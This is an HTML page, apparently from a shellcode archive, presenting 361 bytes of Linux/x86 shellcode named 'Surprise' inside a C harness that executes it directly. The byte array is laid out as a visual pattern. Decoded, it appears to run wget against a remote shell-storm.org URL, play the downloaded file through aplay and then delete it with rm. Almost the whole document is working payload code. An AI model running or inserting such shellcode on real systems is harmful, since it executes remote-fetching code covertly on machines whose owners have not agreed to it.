<html><head><title>Linux/x86 - Surprise ! ! ! - 361 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 | Title:     Linux/x86 - Surprise ! ! ! - 361 bytes
 | Date:      2011-06-27
 | Tested on: Debian 5.0.8
 | Author:    Florian Gaultier - agix - twitter: @Agixid
 |
 | Comment: You need alsa-utils 
 | http://shell-storm.org
*/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
char code[] =
&quot;\x31\xf6\x6a\x02\x58\xcd&quot;
&quot;\x80&quot;
&quot;\x85&quot;
&quot;\xc0&quot;
&quot;\x75&quot;
&quot;\x78\x56\x89\xe2\x89\xe1&quot;
                    &quot;\x80&quot;
                    &quot;\xea&quot;
                    &quot;\x0c&quot;
                    &quot;\x89&quot;
&quot;\xd4\x56\x6a\x62\x66\x68&quot;

&quot;\x78&quot;              &quot;\x2f&quot;
&quot;\x68&quot;              &quot;\x4c&quot;
&quot;\x69&quot;              &quot;\x6e&quot;
&quot;\x75&quot;              &quot;\x68&quot;
&quot;\x6f\x72\x67\x2f\x68\x6f&quot;
&quot;\x72&quot;              &quot;\x6d&quot;
&quot;\x2e&quot;              &quot;\x68&quot;
&quot;\x6c&quot;              &quot;\x2d&quot;
&quot;\x73&quot;              &quot;\x74&quot;

&quot;\x68\x73\x68\x65\x6c\x68&quot;
&quot;\x65&quot;
&quot;\x70&quot;
&quot;\x6f&quot;
&quot;\x2e&quot;
&quot;\x68\x3a\x2f\x2f&quot;
&quot;\x72&quot;
&quot;\x68&quot;
&quot;\x68&quot;
&quot;\x74&quot;
&quot;\x74\x70\x89\xe3\x89\xe2&quot;

&quot;\x89&quot;
&quot;\xcc&quot;
&quot;\x53&quot;
&quot;\x89&quot;
&quot;\xe1&quot;
&quot;\x89&quot;
&quot;\xd4&quot;
&quot;\x56&quot;
&quot;\x66\x68\x2d\x71\x89\xe3&quot;

&quot;\x89&quot;
&quot;\xe2&quot;
&quot;\x89&quot;
&quot;\xcc&quot;
&quot;\x53&quot;
&quot;\x89&quot;
&quot;\xe1&quot;
&quot;\x89&quot;
&quot;\xd4\x56\x6a\x74\x68\x2f&quot;

     &quot;\x77\x67\x65\x68&quot;

&quot;\x2f\x62\x69\x6e\x68\x2f&quot;
&quot;\x75&quot;
&quot;\x73&quot;
&quot;\x72&quot;
&quot;\x89&quot;
&quot;\xe3\x89\xe2\x89\xcc\x53&quot;
                    &quot;\x89&quot;
                    &quot;\xe1&quot;
                    &quot;\x89&quot;
                    &quot;\xd4&quot;
&quot;\x6a\x0b\x58\x31\xd2\xcd&quot;

&quot;\x80\x6a\x07\x58\x31\xdb&quot;
          &quot;\x4b&quot;
          &quot;\x31&quot;
          &quot;\xc9&quot;
          &quot;\x31&quot;
          &quot;\xd2&quot;
          &quot;\xcd&quot;
          &quot;\x80&quot;
          &quot;\x6a&quot;
		  
&quot;\x0b\x5f\x6a\x02\x58\xcd&quot;
&quot;\x80&quot;              &quot;\x85&quot;
&quot;\xc0&quot;              &quot;\x75&quot;
&quot;\x73&quot;              &quot;\x31&quot;
&quot;\xf6&quot;              &quot;\x56&quot;
&quot;\x89&quot;              &quot;\xe2&quot;
&quot;\x89&quot;              &quot;\xe1&quot;
&quot;\x80&quot;              &quot;\xea&quot;
&quot;\x14&quot;              &quot;\x89&quot;
&quot;\xd4\x56\x6a\x62\x89\xe3&quot;

&quot;\x89\xe2\x89\xcc\x53\x89&quot;
&quot;\xe1&quot;              &quot;\x89&quot;
&quot;\xd4&quot;              &quot;\x56&quot;
&quot;\x6a&quot;              &quot;\x30&quot;
&quot;\x68&quot;              &quot;\x39&quot;
&quot;\x30&quot;              &quot;\x30&quot;
&quot;\x30\x89\xe3\x89\xe2\x89&quot;
&quot;\xcc&quot;
&quot;\x53\x89&quot;
&quot;\xe1&quot;  &quot;\x89&quot;
&quot;\xd4&quot;      &quot;\x56&quot;
&quot;\x66&quot;          &quot;\x68&quot;
&quot;\x2d&quot;              &quot;\x72&quot;

&quot;\x89\xe3&quot;       &quot;\x89\xe2&quot;
&quot;\x89&quot; &quot;\xcc&quot; &quot;\x53&quot; &quot;\x89&quot;
&quot;\xe1&quot;    &quot;\x89&quot;     &quot;\xd4&quot;
&quot;\x56&quot;    &quot;\x66&quot;     &quot;\x68&quot;
&quot;\x2d&quot;               &quot;\x71&quot;
&quot;\x89&quot;               &quot;\xe3&quot;
&quot;\x89&quot;               &quot;\xe2&quot;
&quot;\x89&quot;               &quot;\xcc&quot;


&quot;\x53\x89\xe1\x89\xd4\x56&quot;
&quot;\x66\x68\x61\x79\x68\x2f&quot;
&quot;\x61\x70\x6c\x68\x2f\x62&quot;
&quot;\x69\x6e\x68\x2f\x75\x73&quot;
&quot;\x72\x89\xe3\x89\xe2\x89&quot;
&quot;\xcc\x53\x89\xe1\x89\xd4&quot;
&quot;\x6a\x0b\x58\x31\xd2\xcd&quot;
&quot;\x80\x6a\x07\x58\x31\xdb&quot;
&quot;\x4b\x31\xc9\x31\xd2\xcd&quot;
&quot;\x80\x4f\x85\xff\x0f\x85&quot;
&quot;\x6f\xff\xff\xff\x56\x89&quot;
&quot;\xe2\x89\xe1\x80\xea\x0c&quot;
&quot;\x89\xd4\x56\x6a\x62\x89&quot;
&quot;\xe3\x89\xe2\x89\xcc\x53&quot;
&quot;\x89\xe1\x89\xd4\x56\x66&quot;
&quot;\x68\x2d\x66\x89\xe3\x89&quot;
&quot;\xe2\x89\xcc\x53\x89\xe1&quot;
&quot;\x89\xd4\x56\x6a\x6d\x66&quot;
&quot;\x68\x2f\x72\x68\x2f\x62&quot;
&quot;\x69\x6e\x89\xe3\x89\xe2&quot;
&quot;\x89\xcc\x53\x89\xe1\x89&quot;
&quot;\xd4\x6a\x0b\x58\x31\xd2&quot;
       &quot;\xcd\x80&quot;;


int main(int argc, char **argv)
{
int(*f)()=(int(*)())code;
f();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
